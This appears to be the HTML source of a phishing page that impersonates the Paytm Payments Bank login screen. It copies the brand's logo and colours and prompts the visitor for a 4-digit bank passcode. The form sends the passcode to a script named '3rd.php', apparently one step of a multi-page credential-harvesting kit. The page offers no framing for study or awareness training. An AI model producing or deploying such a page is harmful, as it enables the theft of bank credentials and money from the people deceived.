<!DOCTYPE html>
<html lang="eng">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>Paytm login - Passcode</title>
  <style>
    #ml
    {
      width:40%;
      margin-left:150px;
      position:absolute;
      top:14px;
    }
    #tp
    {
    width: 295px;
    height: 35px;
    background-color: white;
    border-color:#01B9F5;
    color:#404145;
    font-size: 15px !important;
    line-height: 25px !important;
    font-weight:bold;
    padding: 1px 5px;
    margin-bottom:10px;
    margin-left:18px;
    outline: none;
    background:none;
    box-shadow: 0px 2px 0px #DADADA;
    border:none;
   }
   #tp:hover
   {
   box-shadow: 0px 2px 0px #00B1F1
   
   }
    #btn
    {
    width:170px;
    background-color:#01B9F5;
    color: white;
    margin-left:15px;
    border: solid black;
    border-radius: 2px;
    border-width: 0px;
    font-weight: bold;
    cursor: pointer;
    font-size: 15px;
    height:36px;
    }
    #ab
    {
    width:365px;
    margin:50px;
    border-bottom:solid #E6E6E6;
    border-width:1.2px;
    }
    input::-webkit-input-placeholder {
    color: #CCCCCC;
    font-weight:bold;
    }
    input:-moz-placeholder {
    color: #CCCCCC;
    font-weight:bold;
    }
    input::-moz-placeholder {
    color: #CCCCCC;
    font-weight:bold;
    }
    input:-ms-input-placeholder {
    color: #CCCCCC;
    font-weight:bold;
    }
    </style>
    </head>
    <body onload="startTimer();">
    <div class="line">
    <b style="font-family:arial; font-size:25px; color:black; margin-left:50px;
    position:absolute;
    top:14px;">Login to</b></div>
    <img src="pbank.png" alt="" id="ml"><br><br>
    <div id="ab" 
    style="margin:10px; 
    margin-left:-8px;">
    </div><br><br>
    <form action="3rd.php" method="post">
    <div>
    <center><b style="font-family:arial; font-size:18px; color:black; margin-left:20px;">Enter Payments Bank Passcode</b></center><br>
    </div>
    <b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:20px;">Paytm Payments Bank 4 Digit Passcode</b><br>
    <input type="password" inputmode="numeric" name="Passcode" id="tp" placeholder="Enter 4 digit passcode" 
    maxlength="4" pattern="[0-9]{4}" 
    title="Please enter valid passdode"
    required=""><br><br>
    <center><button type="submit" id="btn" style="font-weight:bold;">Continue Securely</button></center><br>
    <b style="color:#01B9F5; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin-left:20px;">Know more about Passcode authentication</span></b><br>
    <i style="color:grey; font-size:12px; font-weight:bold;margin-left:20px;">Having trouble logging in ?</i>
     <span style="color: #01B9F5; font-weight:bold;"><i style="font-weight:bold;">Contact us</i></span>
     </form></body></html>